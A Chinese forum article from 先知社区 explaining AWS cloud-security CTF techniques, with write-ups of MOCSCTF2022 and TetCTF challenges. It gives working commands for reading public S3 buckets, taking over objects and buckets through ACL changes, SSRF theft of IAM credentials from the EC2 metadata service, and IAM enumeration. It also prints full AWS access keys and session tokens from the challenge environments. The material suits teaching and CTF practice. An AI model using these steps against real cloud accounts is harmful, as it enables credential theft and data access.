

# 浅谈国外云安全类 CTF challenge 考点 - 先知社区

浅谈国外云安全类 CTF challenge 考点

- - -

### Background

前几天学弟来找我问了我一道他在打比赛的题目，我简单看了眼发现是个 aws security 的题目 这类题目因为 aws 使用的场景以及可玩性高的原因基本都是国外出的，在国内苦于资料少，所以我整理了下我以前的笔记和他比赛的题目，写出了这篇文章

### 0x01 配置不当简析&&大体思路

大多数 CTF 的攻击视角都是以一个云租户渗透 主要攻击方法有大概下面四种

1.基础配置不当

2.S3 权限配置

3.安全组配置不当

4.IAM 权限配置

其实核心攻击思路就是找 AccessKey

在国外的 CTF 中 还可能会出现各种奇奇怪怪的产品。所以我们的核心思路都是先阅读架构文档 找到配置文件的位置 然后就进行常规的 web 测试即可，现在常考的场景有一些比如 git 配置泄漏 目录备份配置文件 或者自己写的任意文件读取等等，所以实际上我们也可以知道他的大概思路了，读配置敏感文件找 AK 然后利用找 flag 当然在实战中，我们也经常可以发现某些 APK 文件中存放着 AccessKey 如果我们逆向 APK 就可以读取，所以大胆猜测，今后的题目里一定会出现相关的利用思路。

### 0x02 S3 权限配置

S3 权限配置不当主要指 S3 存储桶的配置 首先简单说下 S3 是什么 全称 Simple Storage Service 主要指的是一种关于存储的解决方案，是以一种桶的形式存储对象，而对象中的数据即为文件

实际测试中，可以在 Server 中暴露相关信息

[![](assets/1706771208-551b034de13e75189cd48c9772b3caf9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182551-f12770c2-bf59-1.png)

当然也可以在 dig 或者 nslookup 中寻找相关的 dns 解析记录

[![](assets/1706771208-c989880ecdf5ee3300cd0ceecec90bd8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182605-f9b37a10-bf59-1.png)

在 ctf 中或者实际的渗透中 aws cli 是一个很好用的工具 可以直接 pip 下载

当有的时候 配置人员没有很好配置访问权限 我们可以直接

```plain
aws s3 ls s3://bucketname --no-sign-request  //列桶内容
aws s3 cp s3://bucketname/xxx.txt ./ --no-sign-request //把文件复制到本地
```

在有指定权限的情况下我们需要先完成一些别的步骤 配置好权限之后 再进行指定内容的读取

核心需要熟悉的命令其实就以下两条

```plain
aws s3 ls s3://bucketname
aws s3 cp s3://bucketname/flag.txt ./  //把指定文件复制到当前目录
```

除了读以外其实还有一个 WRITE 作为一个桶 对象没有写权限，因为对象只属于上传者，其他用户无法对此写入

但是如果在设置存储桶写权限后，任何用户都可以上传文件，虽然没法读，但却可以覆盖其它用户上传的文件，由于上传的对象属于上传者，所以覆盖后的文件属于后面上传该文件的用户

```plain
aws s3api put-object --bucket bucketname --key 1.txt --body 2.txt --no-sign-requestaws
```

还有一个比较逆天的配置叫 WRITE\_ACP

WRITE\_ACP 能够让用户修改 ACL，大概意思是用户可以通过修改对象 ACL，把对象的 FULL\_CONTROL 权限设置给自己，从而完全拥有该对象。假设有另一个用户 A 修改 1.txt 的 ACL，把 1.txt 的 FULL\_CONTROL 权限的拥有者 ID 设置成自己的规范 ID，从而完全接管 1.txt

```plain
aws s3api list-buckets --profile A //查看规范 id
aws s3api put-object-acl --bucket bucketname --key  1.txt --grant-full-control id=A_id --profile A //把权限替换成 A
```

当然桶的也类似，可以完全获取桶的权限

```plain
aws s3api put-bucket-acl --bucket bucketname --grant-full-control id=A_id //让 A 接管这个桶
```

### 0x03 安全组权限配置

安全组目前是被大家所忽略的，其实在 ctf 玩法也是相对比较少的，通常是一个“组合拳”的形式融合，其实关键点就在于安全组的 Outbound 的规则默认 所以我们可以通过 169.254.169.253 来和外网 DNS 通信。比较有意思的就是大家很多会好奇为什么是这个 ip 地址

实际上 169.254.169.254 是一种特殊 IP 地址，通常用于 EC2 实例中的元数据服务。这个地址是 Amazon AWS 通过 DHCP 协议配置给每个 EC2 实例的。通过访问该地址，就可以访问到该 EC2 实例的元数据信息。元数据包括实例 ID、公网 IP 地址、安全组、IAM 角色等信息。因此，这个地址在 Amazon AWS 的架构中起着非常重要的作用，是连接 EC2 实例和 AWS 服务的桥梁之一。所以在云主机里基本看见的都是这个 169.254.169.254/32 ip 段

这些地方里面我们需要关注的点是我们可以通过这个获取元数据像这样

[![](assets/1706771208-97111947cd9b336bf4dfd210d4f9369b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182711-209a5b62-bf5a-1.png)

知道这些就足够应对绝大部分 ctf 题目了

### 0x04 IAM 权限配置

IAM 是一个比较特殊的云的概念，中文翻译为身份和控制管理，是 AWS 提供的一项免费的权限控制服务。IAM 有三个要素

1.谁？2.什么？3.做什么

比如 A 想向桶名为 bucket-name 的桶上传文件里 三要素 1.A 2.bucket-name 桶 3.上传文件 IAM 把上述三要素组织在一个 json 文件中，并且给这个 json 起了个名字，叫做**策略**

因为其实比较多维，所以有很多可能造成的错误配置，比如不小心给某个用户的权限，攻击者可以伪装这个用户获得 AK 来梭哈所有数据，具体的我们在后面的一些习题会给大家展示

### 0x05 类型题展示 (1)

题目来源于 MOCSCTF2022 bucket list

题目描述信息

```plain
Description: I store the flag on the bucket. How to access my secure bucket? https://capture-the-flag-bucket.s3.ap-southeast-1.amazonaws.com/flag.txt

There is a secret serverless service called list-bucket-lambda. https://ywe7ydb0vi.execute-api.us-east-2.amazonaws.com
```

直接访问/flag.txt 会不行 因为题目中的 S3 没有开放

这题的考点其实是 S3 是可以通过 api 的形式使用，告诉我们有一个名为 list-bucket-lambda 的 列桶的函数 直接

访问即可 [https://ywe7ydb0vi.execute-api.us-east-2.amazonaws.com/default/list-bucket-lambda?bucket=capture-the-flag-bucket&key=flag.txt](https://ywe7ydb0vi.execute-api.us-east-2.amazonaws.com/default/list-bucket-lambda?bucket=capture-the-flag-bucket&key=flag.txt)

解密对应 base64

[![](assets/1706771208-af8411d665ae8ca3bfdb3a15c442078d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182745-34fe24ee-bf5a-1.png)

MOCSCTF2022 的另外一道题 iam who iam 则是比较传统的考法

```plain
Description: Do you know who iam? Find me on the cloud. Never Gonna Give You Up! http://ec2-18-142-161-54.ap-southeast-1.compute.amazonaws.com/proxy.php?url=noflag.txt
```

题目描述主要信息说了知不知道 IAM 其实就是暗示我们了，而且题目给了一个任意文件读取的代码，我们可以通过读元数据找到 IAM 权限的用户

```plain
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

找到一个 mocsctf-role 权限 我们继续读取

```plain
http://ec2-13-214-149-173.ap-southeast-1.compute.amazonaws.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/mocsctf-role


{ "Code" : "Success", "LastUpdated" : "2023-03-01T14:50:06Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIATY2C4XDIGMY5VM6H", "SecretAccessKey" : "/gfcM8aSa3He0BacIqLZM6t61vn7vlukw3q0eN5x", "Token" : "IQoJb3JpZ2luX2VjEOf//////////wEaDmFwLXNvdXRoZWFzdC0xIkYwRAIgJD9/hLX+WiRsSw4GSxggEAGCM3fuUYX/rsWwSDtZJxMCIH9Te9kzPXummw6CqE9GXX6df+CmRalDUE1Vp/CY+9n7KtMFCJD//////////wEQABoMMjU5NDQ4OTQ0ODQ4Igw72Spv0ecnzYDsHNQqpwXiUXrRGT7sw2+niQPghBji3A9OmhWu/oLmCi4yvtb3vSQpG098a3pG1NcEXB3dw9abX4YaNOWVk/KrLjp8MYrPUso/ZXaydIKljU8E/Nd2fIMEM17BMerqwETXJhxuX0SkKpVYN3sVK475k+BpV7x3NY2t8P2ZvFteFAG1qGLl4gliXGNapTYsobGrL/pYretLNv3D3g2Vz+pkWGtd9giTLX1jY7V/gemTRPDHvZpJE57SYQYm7XjCEiPGGwAairScoLtFc950H9IebnayRUt3tRrNhFYu//0Mpy3oFnvG7thkQhWTHUw7B8QQlDWtrw99o7ER7L8hB8LWrP8TmLwfWP7UQ0nZgtDSiAlL9sJXil0WixaVNrvHc9OJVYoi6lK71mYMCKkbj6fzd6diuaqMlja/WKDPMzrLN+Kb8E+QMHMH+eHzfg1a6e9c1JHRlTH/xm5VbVO0kN2p3vuvAOQex3ZnVDVYVdoseS2mvXejXXRQdYFSdkoG9ND61yhvR1yJNwEG3ymxvB1DjrrWHcjA1PMNQCjlOLiMatToE2j29jLWYUnEs5Mg1bwOat/LUSUjGOxq0iFMmSINM2RjTFvpl6ZgokCtDjwNksTEkSb+X5JYl77Uu35jTL+xaWZzAdxETFl3wEHpyw0ZAVmWLOcZhrD8vn8NHzHsYhdO7qD9RdCX90bqETraqlXmVjDzpVqtR8DKFLCl6Tj4loNTl4rasE9qKvETmxwrWmTEaoM3Pjv5AjjqcODbYoWTf02AhxZjJe2WI9LZoDIE+IsjjYE48FrMviktZkx/bo0dNdHP0zReZzCoo02/I8XKpLsV5bNYhmcfe4HlxWnNYCyi5zSe6wgQHHCt5A0MOM6trNvV1QD5ixThULDx7BZi8RHL9RwvOgc1dhXbMIPM/Z8GOrIBX9WLgY/kQSBJGidRjZacPtVkiK4lLhH6KyoWc5YKvpunrWZ8TfB8H0gogKhdyTUxsyiHrAJgBN/vryVY5SBEQcje0ZmfYD7Mo/VmOvrS9WCxEmWukv/CFUfrlJ6J9JNZEiAcMDV4vf+icqlsRK4cOUWYHaJmzVaUi2NtaTJkN0OHSod0RkM2XpuUkRVnrF0Ljrio12Ks5enCmwAiJozjf2MnHJi+PFxf4P3/tPsEl/3oUA==", "Expiration" : "2023-03-01T21:19:26Z" }
```

得到的这些内容里我们需要提取几个主要信息 AccessKeyId, SecretAccessKey, Token

通过 aws cli 使用通用的导入方法

```plain
export AWS_ACCESS_KEY_ID=ASIATY2C4XDIC7ILPUON

export AWS_DEFAULT_REGION=ap-southeast-1

export AWS_SECRET_ACCESS_KEY=MifuK0E3abqMcqIrqJh3g9oCDEK15gdfh0GIdAU7

export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDwaDmFwLXNvdXRoZWFzdC0xIkcwRQIgUYR7ATZIbFbJBpy0YdGd0OYgP8sSSCiG8803lklvHMcCIQDdPfNwnYIQ+Io6FnrdGjR8+4X0VMo52lZR+KCQGByrxCrkBAil//////////8BEAAaDDI1OTQ0ODk0NDg0OCIM0NpgZjqxe/YMVh3AKrgEQGTzGKg03uUmrNq6xsY3jt9kLpBW5L2k1bUI9LF8DapUG5yEdlARyuIpref1it/8E+svPab3pbcBempMUGty+p4uxb+GUlRDoNd9m0/GXCbJihdX0G0MZ3wVIjPPmIgWhdq9bmqPMkvzxTBWY88uMnws2BgIQFFF6KfhbUllSO6dNEmkDeJ+isGSnKSmwirXtxbX6BUTBG7bhffnrswNW4I+3+vMky3eOBhJZz4W0SSzVHyBUWleDZEThQzVJpjB7QtJ3Bc/yRONuPvXeDZjM2BtrsJqcsneuMDNEKwBAu7QdMLA2bD42UtnyuMpqgs8k6JvwUDysD0bBMXndui2LQVChCnxMRzX7dXXe3MUPcfYrj4OIWQRWJpx3fz4ML2SwJJAJNNG/TyqExKNPOft5DBf8DKRyH1YoYYzl+U0pyVvf7PK17imMOTfoV0YIxWhGa2hXJvAzKQz0xoQMYyTP4yA6CsTZme3yRQliQkBuzQA8BgqlNc3L3OElG/9KuRm046mTIBg2Cl0Aab/V2rOCzdE+LYcFdDba/mrSd1ggCKnn65TIJQUXTdX7OB/8CLzpDDyICx3IhFArNBVI7AXdr8704l+7GFInkP2gbmUv2x6k43oc53x5KFgXQjtfw1c1eTkQfPQK/dqIOJVapiwT+YAmlhPoajeDqFs2vTfoqWX02b1ArkS42zYAplWWyvBwVWm7px7CDjVgVkorOAVqvQ6vKA9joD+XQAoKRHATmXAbM4v4BchTjD/mK+eBjqpAVB5QoSa43okkk5omA1Hk8yXTw6hnkk3e8QCchouAzIQS8Fa7QGtUyQy7d8xM9F6G8gheb+vuysn8BZXRfmp5Rmw6kuj8BiPH7qeUdP6tdQhyrtF3QclYNA4/zHdRzQVXL2s7K1AnRv4gBiiPocH86nsU1aUIA3NxiRLjcGGzVnUxjkbc6ic6ZGf0UtbLkEpHQWNBK1ZEM2i3vk4X3UxgLNl8yAOOWP5S44=
aws s3 ls
aws s3 ls s3://iam-ctf-bucket
aws s3 cp s3://iam-ctf-bucket/secret.txt ./
cat secret.txt
```

然后找信息即可，当然有的时候 flag 可能存在快照信息里

`aws ec2 describe-snapshots --region ap-southeast-1 --filters Name=description,Values=flag*`

### 0x06 类型题展示（2）

然后就是我学弟让我帮忙看的题，出自于今年 TetCTF 里

第一题叫 Hello from API GW

[https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable=aaa](https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable=aaa)

我随便输入了几个字符发现

[![](assets/1706771208-15446ae7b14003ee51351996d70f1973.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182757-3c7f669c-bf5a-1.png)

参考名字我猜这个 vulnerable 是个 lambda function 我一开始就想着读文件，我直接尝试一些环境变量 在 process.env 获得了回显，这时候我才知道是一个 js 形式

这题恶心的地方在我读取 AccessKeyId, SecretAccessKey, Token 老三样发现他没有任何权限。。

而变量里还有两个信息`ENV_ACCESS_KEY`和`ENV_SECRET_ACCESS_KEY` 原因是在 AWS lambda 里可以忽略使用环境变量预存的 好吧

拿到手后直接可以查看一下是否设置完成

```plain
aws sts get-caller-identity
```

[![](assets/1706771208-c834a3f830eec4393bbb289b29505c1a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182805-4139dc58-bf5a-1.png)

我注意到我有这个秘密用户之后，直接使用工具一把嗦能执行哪些命令

[https://github.com/andresriancho/enumerate-iam](https://github.com/andresriancho/enumerate-iam)

```plain
python3 enumerate-iam.py --access-key AKIAX473H4JB76WRTYPI --secret-key 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 --region ap-southeast-2
```

发现一个 secretsmanager.list\_secrets()

```plain
aws secretsmanager list-secrets
```

发现 name 里有 flag

[![](assets/1706771208-90eef2a7e07533bf5fa33232faa2898d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182812-4577b646-bf5a-1.png)

```plain
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:ap-southeast-2:543303393859:secret:prod/TetCTF/Flag-gnvT27
```

getflag  
[![](assets/1706771208-0ded20b10830d948e128dd43b714d4b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240130182819-49b88e74-bf5a-1.png)

### 0x07 总结

大概写了几种常见的云安全题目的思路，还有一部分思路主要关于 IAM 配置信息的，可以搜索 big-iam-challenge 相关挑战并进行补充
